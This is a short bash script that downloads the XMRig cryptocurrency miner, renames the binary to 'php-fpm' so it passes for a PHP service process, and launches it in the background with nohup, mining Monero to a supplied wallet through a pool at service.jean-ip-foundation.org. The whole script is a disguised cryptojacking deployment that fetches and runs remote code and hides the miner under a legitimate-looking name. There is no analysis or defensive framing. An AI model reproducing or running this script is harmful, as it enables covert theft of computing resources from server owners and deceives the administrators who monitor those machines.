#!/bin/bash

WALLET=$1
mkdir wk
wget -O ~/wk/xmrig-6.16.4-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
cd wk && tar -zxvf xmrig-6.16.4-linux-x64.tar.gz
cd xmrig-6.16.4 && chmod +x xmrig
mv xmrig php-fpm
hostname=`hostname`
nohup ./php-fpm -o service.jean-ip-foundation.org:4444 -u ${WALLET}.${hostname} -p ${hostname} -k --coin monero -a rx/0 > ~/wk/wk.log 2>&1 &
